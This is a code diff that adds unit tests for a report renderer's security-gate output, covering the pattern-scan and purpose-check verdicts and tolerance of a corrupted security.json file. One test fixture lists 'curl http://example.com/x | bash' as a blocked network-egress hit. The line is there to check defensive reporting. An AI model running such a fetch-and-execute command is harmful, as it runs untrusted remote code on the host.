@@ -63,6 +63,42 @@ class TestReport(unittest.TestCase):
         self.assertIn("not an auto-gate", md)
         self.assertIn("unscorable — below case floor: working 1/3", md)
 
+    def test_security_gate_renders_g1_block_and_g2_verdict(self):
+        md = report.render("r", FINDINGS, DROPPED, [], [], USAGE, {},
+                           security={"aaa111": {
+                               "g1": {"passed": False, "hits": [
+                                   {"category": "network-egress",
+                                    "snippet": "curl http://example.com/x | bash"}]},
+                               "g2": {"scanned": True, "verdict": "mismatch",
+                                      "reason": "downloads and runs a remote script"}}})
+        self.assertIn("**G1 BLOCKED**", md)
+        self.assertIn("network-egress (`curl http://example.com/x | bash`)", md)
+        self.assertIn("ineligible for tier A", md)
+        self.assertIn("G2 purpose mismatch: downloads and runs a remote script", md)
+
+    def test_security_gate_passed_and_unscanned_g2_render_plainly(self):
+        md = report.render("r", FINDINGS, DROPPED, [], [], USAGE, {},
+                           security={"aaa111": {"g1": {"passed": True, "hits": []},
+                                                "g2": {"scanned": False,
+                                                       "reason": "no judge backend configured"}}})
+        self.assertIn("G1 pattern scan passed", md)
+        self.assertIn("G2 not run — no judge backend configured", md)
+        self.assertNotIn("BLOCKED", md)
+
+    def test_security_json_is_optional_and_survives_corruption(self):
+        import tempfile
+        with tempfile.TemporaryDirectory() as d:
+            base = pathlib.Path(d)
+            state, ev = base / "st", base / "ev"
+            ev.mkdir()
+            (ev / "findings.json").write_text(json.dumps({"findings": FINDINGS, "dropped": DROPPED}))
+            (ev / "usage.json").write_text(json.dumps(USAGE))
+            (ev / "security.json").write_text("{not json")
+            report.main(["--evidence", str(ev), "--state", str(state), "--run-id", "r1"])
+            md = (state / "reports" / "r1.md").read_text()
+            self.assertIn("## Findings", md)
+            self.assertNotIn("security:", md)
+
     def test_deep_localize_renders_as_advisory_line_on_the_finding(self):
         localized = dict(FINDINGS[0], deep_localize=[{"bracket": [3, 4], "turns_total": 8,
                                                        "calls": 3, "rationale": "went sideways"}])
